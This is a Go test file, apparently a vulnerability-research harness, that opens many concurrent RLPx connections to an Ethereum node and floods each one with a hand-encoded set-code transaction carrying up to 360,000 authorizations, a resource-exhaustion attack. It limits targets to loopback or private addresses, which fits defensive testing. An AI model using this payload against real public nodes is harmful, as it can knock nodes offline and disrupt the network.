package ethtest

import (
	"encoding/binary"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/eth/protocols/eth"
	"github.com/ethereum/go-ethereum/p2p"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/p2p/rlpx"
	"github.com/ethereum/go-ethereum/rlp"
)

func TestFEFS122LiveRLPx(t *testing.T) {
	rawurl := os.Getenv("FEF_S122_ENODE")
	if rawurl == "" {
		t.Skip("set FEF_S122_ENODE")
	}
	peers := 17
	if value := os.Getenv("FEF_S122_PEERS"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed <= 0 {
			t.Fatalf("invalid FEF_S122_PEERS=%q", value)
		}
		peers = parsed
	}
	authorizations := 360_000
	if value := os.Getenv("FEF_S122_AUTH_COUNT"); value != "" {
		parsed, err := strconv.Atoi(value)
		if err != nil || parsed < 0 || parsed > 360_000 {
			t.Fatalf("invalid FEF_S122_AUTH_COUNT=%q", value)
		}
		authorizations = parsed
	}
	dest, err := enode.ParseV4(rawurl)
	if err != nil {
		t.Fatal(err)
	}
	if ip := dest.IP(); ip == nil || !(ip.IsLoopback() || ip.IsPrivate()) {
		t.Fatalf("VEC-078 sender requires a loopback or private target IP, got %v", ip)
	}
	suite := &Suite{Dest: dest}
	connections := make([]*Conn, peers)
	var connect sync.WaitGroup
	connect.Add(peers)
	for i := range peers {
		go func() {
			defer connect.Done()
			conn, err := dialAndMirrorStatus122(suite)
			if err != nil {
				t.Errorf("peer %d: %v", i, err)
				return
			}
			connections[i] = conn
		}()
	}
	connect.Wait()
	if t.Failed() {
		for _, conn := range connections {
			if conn != nil {
				conn.Close()
			}
		}
		t.FailNow()
	}

	payload := nestedSetCodeTransactionsPacketLive(authorizations)
	start := make(chan struct{})
	var send sync.WaitGroup
	send.Add(peers)
	begin := time.Now()
	for _, conn := range connections {
		go func() {
			defer send.Done()
			<-start
			conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
			_, _ = conn.Conn.Write(protoOffset(ethProto)+eth.TransactionsMsg, payload)
			runtime.KeepAlive(conn)
		}()
	}
	close(start)
	send.Wait()
	t.Logf("sent peers=%d authorizations=%d decodedBytesEach=%d elapsed=%s", peers, authorizations, len(payload), time.Since(begin))
	time.Sleep(500 * time.Millisecond)
	var closed atomic.Int32
	var timedOut atomic.Int32
	var observe sync.WaitGroup
	observe.Add(peers)
	for _, conn := range connections {
		go func() {
			defer observe.Done()
			defer conn.Close()
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			for {
				code, _, _, err := conn.Conn.Read()
				if err != nil {
					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
						timedOut.Add(1)
					} else {
						closed.Add(1)
					}
					return
				}
				if code == discMsg {
					closed.Add(1)
					return
				}
				if code == pingMsg {
					_ = conn.Write(baseProto, pongMsg, []byte{})
				}
			}
		}()
	}
	observe.Wait()
	t.Logf("connections closed by target=%d timed out locally=%d total=%d", closed.Load(), timedOut.Load(), peers)
}

func dialAndMirrorStatus122(s *Suite) (*Conn, error) {
	key, err := crypto.GenerateKey()
	if err != nil {
		return nil, err
	}
	tcpEndpoint, _ := s.Dest.TCPEndpoint()
	fd, err := net.DialTimeout("tcp", tcpEndpoint.String(), 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn := &Conn{Conn: rlpx.NewConn(fd, s.Dest.Pubkey()), ourKey: key}
	if _, err := conn.Handshake(key); err != nil {
		fd.Close()
		return nil, err
	}
	conn.caps = []p2p.Cap{{Name: "eth", Version: 72}}
	conn.ourHighestProtoVersion = 72
	if err := conn.handshake(); err != nil {
		conn.Close()
		return nil, err
	}
	for {
		code, data, err := conn.Read()
		if err != nil {
			conn.Close()
			return nil, err
		}
		switch code {
		case protoOffset(ethProto) + eth.StatusMsg:
			var status eth.StatusPacket
			if err := rlp.DecodeBytes(data, &status); err != nil {
				conn.Close()
				return nil, err
			}
			if err := conn.Write(ethProto, eth.StatusMsg, &status); err != nil {
				conn.Close()
				return nil, err
			}
			return conn, nil
		case pingMsg:
			if err := conn.Write(baseProto, pongMsg, []byte{}); err != nil {
				conn.Close()
				return nil, err
			}
		}
	}
}

func nestedSetCodeTransactionsPacketLive(count int) []byte {
	typedPayload := nestedSetCodeTypedTransactionLive(count)
	return encodeList122(encodeString122(typedPayload))
}

func nestedSetCodeTypedTransactionLive(count int) []byte {
	return nestedSetCodeTypedTransactionSaltedLive(count, 0)
}

func nestedSetCodeTypedTransactionSaltedLive(count int, salt byte) []byte {
	authorization := append([]byte{0xda, 0x01, 0x94}, make([]byte, 20)...)
	authorization = append(authorization, 0x80, 0x80, 0x01, 0x01)
	authPayload := make([]byte, count*len(authorization))
	for offset := 0; offset < len(authPayload); offset += len(authorization) {
		copy(authPayload[offset:], authorization)
	}
	authList := encodeList122(authPayload)
	fields := []byte{0x01, 0x80, 0x80, 0x80, 0x80, 0x94}
	to := make([]byte, 20)
	to[len(to)-1] = salt
	fields = append(fields, to...)
	fields = append(fields, 0x80, 0x80, 0xc0)
	fields = append(fields, authList...)
	fields = append(fields, 0x80, 0x01, 0x01)
	return append([]byte{types.SetCodeTxType}, encodeList122(fields)...)
}

func encodeList122(payload []byte) []byte {
	return encodeValue122(payload, 0xc0, 0xf7)
}

func encodeString122(payload []byte) []byte {
	return encodeValue122(payload, 0x80, 0xb7)
}

func encodeValue122(payload []byte, shortBase, longBase byte) []byte {
	if len(payload) <= 55 {
		return append([]byte{shortBase + byte(len(payload))}, payload...)
	}
	var size [8]byte
	binary.BigEndian.PutUint64(size[:], uint64(len(payload)))
	first := 0
	for size[first] == 0 {
		first++
	}
	header := append([]byte{longBase + byte(len(size[first:]))}, size[first:]...)
	return append(header, payload...)
}
